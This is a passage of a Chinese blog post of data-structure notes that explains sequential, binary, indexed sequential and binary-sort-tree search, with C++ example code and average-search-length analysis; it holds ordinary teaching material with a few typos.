<span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    ST.length=<span class="number">10</span>;</span><br><span class="line">    ST.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ElemType)*(ST.length+<span class="number">1</span>));</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=<span class="literal">NULL</span>;</span><br><span class="line">    ST.elem[<span class="number">1</span>].key=<span class="number">1</span>;</span><br><span class="line">    ST.elem[<span class="number">2</span>].key=<span class="number">5</span>;</span><br><span class="line">    ST.elem[<span class="number">3</span>].key=<span class="number">3</span>;</span><br><span class="line">    ST.elem[<span class="number">4</span>].key=<span class="number">9</span>;</span><br><span class="line">    ST.elem[<span class="number">5</span>].key=<span class="number">10</span>;</span><br><span class="line">    ST.elem[<span class="number">6</span>].key=<span class="number">14</span>;</span><br><span class="line">    ST.elem[<span class="number">7</span>].key=<span class="number">2</span>;</span><br><span class="line">    ST.elem[<span class="number">8</span>].key=<span class="number">12</span>;</span><br><span class="line">    ST.elem[<span class="number">9</span>].key=<span class="number">19</span>;</span><br><span class="line">    ST.elem[<span class="number">10</span>].key=<span class="number">17</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search_Seq</span>(ST, <span class="number">13</span>));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h5><p>进行比较的关键字个数的期望值： 即查找成功时的平均查找长度</p><script type="math/tex; mode=display">ASL=\sum_{i=1}^{n}P_iC_i</script><p>其中n为表长</p><p>$P_i$为查找表中第i个记录被查找的概率</p><p>$C_i$为找到记录i时关键字的比较次数</p><p>在等概率查找情况下，$P_i=\frac{1}{n}$</p><p>顺序表的平均(成功)查找长度为：$ASL_{ss}=\frac{1}{n}\sum_{i=1}^n(n-i+1)=\frac{n+1}{2}$</p><p>在不等概率查找的情况下，ASL在$P_n\geqslant P_{n-1}\geqslant …\geqslant P_2 \geqslant P_1$ 时取最小值</p><p>$ASL_{失败}=n+1$</p><h4 id="有序表的查找"><a href="#有序表的查找" class="headerlink" title="有序表的查找"></a>有序表的查找</h4><h5 id="折半查找"><a href="#折半查找" class="headerlink" title="折半查找"></a>折半查找</h5><p>前提要求：顺序存储且有序</p><h5 id="折半查找的思想"><a href="#折半查找的思想" class="headerlink" title="折半查找的思想"></a>折半查找的思想</h5><p>1.将要查找的关键字与查找表中间的元素的关键字进行比较，若相等，返回当前位置</p><p>2.若查找关键字比当前位置关键字小，向前秭归，否则向后递归</p><h5 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Search_Bin</span><span class="params">(SSTable ST,KeyType key)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> low=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> high=ST.length;</span><br><span class="line">    <span class="type">int</span> mid;</span><br><span class="line">    <span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">        mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(ST.elem[mid].key==key) <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ST.elem[mid].key&gt;key)&#123;</span><br><span class="line">            high=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> low=mid+<span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="comment">//折半查找，有序表；</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    ST.length=<span class="number">10</span>;</span><br><span class="line">    ST.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ElemType)*(ST.length+<span class="number">1</span>));</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=<span class="literal">NULL</span>;</span><br><span class="line">    ST.elem[<span class="number">1</span>].key=<span class="number">1</span>;</span><br><span class="line">    ST.elem[<span class="number">2</span>].key=<span class="number">3</span>;</span><br><span class="line">    ST.elem[<span class="number">3</span>].key=<span class="number">5</span>;</span><br><span class="line">    ST.elem[<span class="number">4</span>].key=<span class="number">7</span>;</span><br><span class="line">    ST.elem[<span class="number">5</span>].key=<span class="number">9</span>;</span><br><span class="line">    ST.elem[<span class="number">6</span>].key=<span class="number">10</span>;</span><br><span class="line">    ST.elem[<span class="number">7</span>].key=<span class="number">12</span>;</span><br><span class="line">    ST.elem[<span class="number">8</span>].key=<span class="number">14</span>;</span><br><span class="line">    ST.elem[<span class="number">9</span>].key=<span class="number">20</span>;</span><br><span class="line">    ST.elem[<span class="number">10</span>].key=<span class="number">21</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search_Bin</span>(ST, <span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>折半查找只适用于静态查找</p><h5 id="算法分析-1"><a href="#算法分析-1" class="headerlink" title="算法分析"></a>算法分析</h5><p>时间复杂度为$O(\log_2n)$</p><p>对于n个元素，二分查找，成功最多关键字比较次数为$\lceil log_2(n+1)\rceil$（向上取整），不成功的关键字比较次数为：$\lceil log_2(n+1)\rceil$</p><h5 id="折半查找的递归实现"><a href="#折半查找的递归实现" class="headerlink" title="折半查找的递归实现"></a>折半查找的递归实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BinSearch2</span><span class="params">(SSTable ST,<span class="type">int</span> low,<span class="type">int</span> high,KeyType key)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> mid;</span><br><span class="line">    <span class="keyword">if</span>(low&gt;high) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;ST.elem[mid].key)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">BinSearch2</span>(ST, low, mid<span class="number">-1</span>, key);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(key&gt;ST.elem[mid].key)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">BinSearch2</span>(ST, mid+<span class="number">1</span>, high, key);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    ST.length=<span class="number">10</span>;</span><br><span class="line">    ST.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ElemType)*(ST.length+<span class="number">1</span>));</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=<span class="literal">NULL</span>;</span><br><span class="line">    ST.elem[<span class="number">1</span>].key=<span class="number">1</span>;</span><br><span class="line">    ST.elem[<span class="number">2</span>].key=<span class="number">3</span>;</span><br><span class="line">    ST.elem[<span class="number">3</span>].key=<span class="number">5</span>;</span><br><span class="line">    ST.elem[<span class="number">4</span>].key=<span class="number">7</span>;</span><br><span class="line">    ST.elem[<span class="number">5</span>].key=<span class="number">9</span>;</span><br><span class="line">    ST.elem[<span class="number">6</span>].key=<span class="number">10</span>;</span><br><span class="line">    ST.elem[<span class="number">7</span>].key=<span class="number">12</span>;</span><br><span class="line">    ST.elem[<span class="number">8</span>].key=<span class="number">14</span>;</span><br><span class="line">    ST.elem[<span class="number">9</span>].key=<span class="number">20</span>;</span><br><span class="line">    ST.elem[<span class="number">10</span>].key=<span class="number">21</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">BinSearch2</span>(ST, <span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="索引顺序表的查找"><a href="#索引顺序表的查找" class="headerlink" title="索引顺序表的查找"></a>索引顺序表的查找</h4><h5 id="索引顺序表的存储要求"><a href="#索引顺序表的存储要求" class="headerlink" title="索引顺序表的存储要求"></a>索引顺序表的存储要求</h5><p>两张表 一张线性表 一张索引表</p><p>线性表要求：查找表分为n块，当i&gt;j时，第i块中的最小元素的关键字大于第j块中的最大元素的关键字</p><p>索引表要求：1.索引表是顺序存储 2.索引表里存储了各个块的最大值和开始地址</p><h5 id="索引顺序表的查找思想"><a href="#索引顺序表的查找思想" class="headerlink" title="索引顺序表的查找思想"></a>索引顺序表的查找思想</h5><p>1.首先确定所要查找的关键字在哪一块</p><p>2.在所确定的块中用顺序查找查找关键字</p><h5 id="索引表的存储结构"><a href="#索引表的存储结构" class="headerlink" title="索引表的存储结构"></a>索引表的存储结构</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> maxblock 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  KeyType key;</span><br><span class="line">  <span class="type">int</span> addr;</span><br><span class="line">&#125;indextype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  indextype index[maxblock];</span><br><span class="line">  <span class="type">int</span> block;</span><br><span class="line">&#125;INtable;</span><br></pre></td></tr></table></figure><h5 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  main.cpp</span></span><br><span class="line"><span class="comment">//  索引顺序表</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by 徐可钊 on 2023/11/20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxblock 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  KeyType key;</span><br><span class="line">    <span class="type">int</span> addr;</span><br><span class="line">&#125;indextype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  indextype index[maxblock];</span><br><span class="line">  <span class="type">int</span> block;</span><br><span class="line">&#125;INtable;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">&#125;ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  ElemType *elem;</span><br><span class="line">  <span class="comment">//数据元素存储空间基址，建表时，按实际长度分配，0号单元留空</span></span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">&#125;SSTable;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Search</span><span class="params">(SSTable ST,INtable IX,KeyType key )</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,s=<span class="number">0</span>,e;</span><br><span class="line">    <span class="comment">//s记录查找表中的开始位置</span></span><br><span class="line">    <span class="comment">//e记录查找表中的结束位置</span></span><br><span class="line">    <span class="keyword">while</span>((key&gt;IX.index[i].key)&amp;&amp;(i&lt;IX.block))&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;IX.block)&#123;</span><br><span class="line">        s=IX.index[i].addr;</span><br><span class="line">        <span class="keyword">if</span>(i==IX.block<span class="number">-1</span>) e=ST.length;</span><br><span class="line">        <span class="keyword">else</span> e=IX.index[i+<span class="number">1</span>].addr<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(key!=ST.elem[s].key&amp;&amp;s&lt;=e)</span><br><span class="line">    &#123;</span><br><span class="line">        s+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(s&lt;=e) <span class="keyword">return</span> s;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    SSTable ST;</span><br><span class="line">    ST.length=<span class="number">10</span>;</span><br><span class="line">    ST.elem=(ElemType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(KeyType)*(ST.length+<span class="number">1</span>));</span><br><span class="line">    ST.elem[<span class="number">0</span>].key=<span class="number">22</span>;</span><br><span class="line">    ST.elem[<span class="number">1</span>].key=<span class="number">12</span>;</span><br><span class="line">    ST.elem[<span class="number">2</span>].key=<span class="number">9</span>;</span><br><span class="line">    ST.elem[<span class="number">3</span>].key=<span class="number">20</span>;</span><br><span class="line">    <span class="comment">//==========</span></span><br><span class="line">    ST.elem[<span class="number">4</span>].key=<span class="number">33</span>;</span><br><span class="line">    ST.elem[<span class="number">5</span>].key=<span class="number">42</span>;</span><br><span class="line">    ST.elem[<span class="number">6</span>].key=<span class="number">48</span>;</span><br><span class="line">    <span class="comment">//==========</span></span><br><span class="line">    ST.elem[<span class="number">7</span>].key=<span class="number">49</span>;</span><br><span class="line">    ST.elem[<span class="number">8</span>].key=<span class="number">60</span>;</span><br><span class="line">    ST.elem[<span class="number">9</span>].key=<span class="number">86</span>;</span><br><span class="line">    ST.elem[<span class="number">10</span>].key=<span class="number">53</span>;</span><br><span class="line">    INtable IX;</span><br><span class="line">    IX.block=<span class="number">3</span>;</span><br><span class="line">    IX.index[<span class="number">0</span>].key=<span class="number">22</span>;</span><br><span class="line">    IX.index[<span class="number">0</span>].addr=<span class="number">0</span>;</span><br><span class="line">    IX.index[<span class="number">1</span>].key=<span class="number">48</span>;</span><br><span class="line">    IX.index[<span class="number">1</span>].addr=<span class="number">4</span>;</span><br><span class="line">    IX.index[<span class="number">2</span>].key=<span class="number">86</span>;</span><br><span class="line">    IX.index[<span class="number">2</span>].addr=<span class="number">7</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search</span>(ST, IX, <span class="number">53</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search</span>(ST, IX, <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">Search</span>(ST, IX, <span class="number">49</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="算法分析-2"><a href="#算法分析-2" class="headerlink" title="算法分析"></a>算法分析</h5><p>如果索引表长度为b，每块平均程度为L 平均查找长度为：$(b+1)/2+(L+1)/2$</p><p>长度为n的线性表，平均分为$\sqrt n$  查找次数最少</p><h3 id="动态查找表"><a href="#动态查找表" class="headerlink" title="动态查找表"></a>动态查找表</h3><h4 id="二叉排序树和平衡二叉树"><a href="#二叉排序树和平衡二叉树" class="headerlink" title="二叉排序树和平衡二叉树"></a>二叉排序树和平衡二叉树</h4><h5 id="二叉排序树的定义"><a href="#二叉排序树的定义" class="headerlink" title="二叉排序树的定义"></a>二叉排序树的定义</h5><p>二叉排序树(Binary Sort Tree)或者是一颗空树；或者是具有下列性质的二叉树：若根结点有左子树，则左子树上所有结点关键字的值均小于根结点的关键字的值；若根结点有右子树，则右子树上所有结点关键字的值均大结点的关键字的值；根结点的左右子树也分别为二叉排序树。</p><h5 id="二叉排序树的结点查找"><a href="#二叉排序树的结点查找" class="headerlink" title="二叉排序树的结点查找"></a>二叉排序树的结点查找</h5><p>例：<img src="/2023/11/21/二叉排序树的例子.png" alt="二叉排序树例子"><br>查找思想：</p><p>1.当二叉排序树不空时，先将给定值和根结点的关键字比较，若相等，则查找成功；否则：</p><p>2.若给定值小于根结点的关键字，则在左子树上继续进行查砸后</p><p>3.若给定值大于根结点的关键字，则在右子树上继续进行查找</p><p>4.直到找到或查到空结点为止。</p><p>存储结构</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">    <span class="comment">//  其他信息</span></span><br><span class="line">&#125;TElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiTNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span> *lch,*rch;</span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BiTNode</span>* <span class="built_in">createNode</span>(<span class="type">int</span> value) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span>* newNode = (BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> BiTNode));</span><br><span class="line">    newNode-&gt;data.key = value;</span><br><span class="line">    newNode-&gt;lch = <span class="literal">NULL</span>;</span><br><span class="line">    newNode-&gt;rch = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    BiTree T=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">    T-&gt;data.key=<span class="number">45</span>;</span><br><span class="line">    T-&gt;lch=<span class="built_in">createNode</span>(<span class="number">12</span>);</span><br><span class="line">    T-&gt;lch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">3</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">37</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">24</span>);</span><br><span class="line">    T-&gt;rch=<span class="built_in">createNode</span>(<span class="number">53</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">100</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">61</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">90</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">78</span>);</span><br><span class="line">    <span class="comment">//创建了如图的二叉排序树</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>算法实现</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">    <span class="comment">//  其他信息</span></span><br><span class="line">&#125;TElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiTNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span> *lch,*rch;</span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BiTNode</span>* <span class="built_in">createNode</span>(<span class="type">int</span> value) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span>* newNode = (BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> BiTNode));</span><br><span class="line">    newNode-&gt;data.key = value;</span><br><span class="line">    newNode-&gt;lch = <span class="literal">NULL</span>;</span><br><span class="line">    newNode-&gt;rch = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTree <span class="title">SearchBST</span><span class="params">(BiTree T,KeyType key)</span></span>&#123;</span><br><span class="line">    BiTree p=T;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data.key==key)</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;p-&gt;data.key)</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        <span class="keyword">else</span> p=p-&gt;rch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    BiTree T=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">    T-&gt;data.key=<span class="number">45</span>;</span><br><span class="line">    T-&gt;lch=<span class="built_in">createNode</span>(<span class="number">12</span>);</span><br><span class="line">    T-&gt;lch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">3</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">37</span>);</span><br><span class="line">    T-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">24</span>);</span><br><span class="line">    T-&gt;rch=<span class="built_in">createNode</span>(<span class="number">53</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">100</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">61</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch=<span class="built_in">createNode</span>(<span class="number">90</span>);</span><br><span class="line">    T-&gt;rch-&gt;rch-&gt;lch-&gt;rch-&gt;lch=<span class="built_in">createNode</span>(<span class="number">78</span>);</span><br><span class="line">    <span class="comment">//创建了如图的二叉排序树</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">SearchBST</span>(T, <span class="number">24</span>)-&gt;data.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>算法分析</p><p>1.二叉排序树平均查找长度的嘴擦情况与顺序表相同（关键字有序）为$O(n)$</p><p>2.最好情况与折半查找相同，是$O(\log_2{n})$数量级</p><p>3.二叉排序树的平均查找长度是$O(\log_2{n})$</p><p>若，以中序对二叉查找树遍历，特点为：按关键字升序排序</p><h5 id="二叉排序树的结点插入"><a href="#二叉排序树的结点插入" class="headerlink" title="二叉排序树的结点插入"></a>二叉排序树的结点插入</h5><p>算法思想</p><p>1.若二叉树为空，则待插入结点s作为根结点</p><p>2.当二叉排序树非空时：</p><p>将待插结点关键字与根结点进行比较，</p><p>若相等则树中已有此结点，无需插入；</p><p>若小于根结点，插入左子树；</p><p>若大于根结点，插入右子树。</p><p>算法实现</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    KeyType key;</span><br><span class="line">    <span class="comment">//  其他信息</span></span><br><span class="line">&#125;TElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">BiTNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span> *lch,*rch;</span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BiTNode</span>* <span class="built_in">createNode</span>(<span class="type">int</span> value) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiTNode</span>* newNode = (BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> BiTNode));</span><br><span class="line">    newNode-&gt;data.key = value;</span><br><span class="line">    newNode-&gt;lch = <span class="literal">NULL</span>;</span><br><span class="line">    newNode-&gt;rch = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BiTree <span class="title">SearchBST</span><span class="params">(BiTree T,KeyType key)</span></span>&#123;</span><br><span class="line">    BiTree p=T;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data.key==key)</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;p-&gt;data.key)</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        <span class="keyword">else</span> p=p-&gt;rch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SearchBST</span><span class="params">(BiTree T,KeyType key ,BiTree f,BiTree &amp;p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!T)&#123;p=f;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key==T-&gt;data.key)&#123;p=T;<span class="keyword">return</span> <span class="number">1</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T-&gt;data.key) <span class="keyword">return</span> <span class="built_in">SearchBST</span>(T-&gt;lch,key,T,p);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">SearchBST</span>(T-&gt;rch, key,T,p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertBST</span><span class="params">(BiTree &amp;T,TElemType e)</span></span>&#123;</span><br><span class="line">    BiTree p,s;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">SearchBST</span>(T, e.key,<span class="literal">NULL</span>,p))&#123;</span><br><span class="line">        s=(BiTree)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        s-&gt;data=e;</span><br><span class="line">        s-&gt;lch=s-&gt;rch=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span>(!p) T=s;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(e.key&lt;p-&gt;data.key)</span><br><span class="line">            p-&gt;lch=s;</span><br><span class="line">        <span class="keyword">else</span> p-&gt;rch=s;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertBST_D</span><span class="params">(TElemType e,BiTree &amp;T)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        T=(BiTree)<span class="built_in">malloc</span>(<span 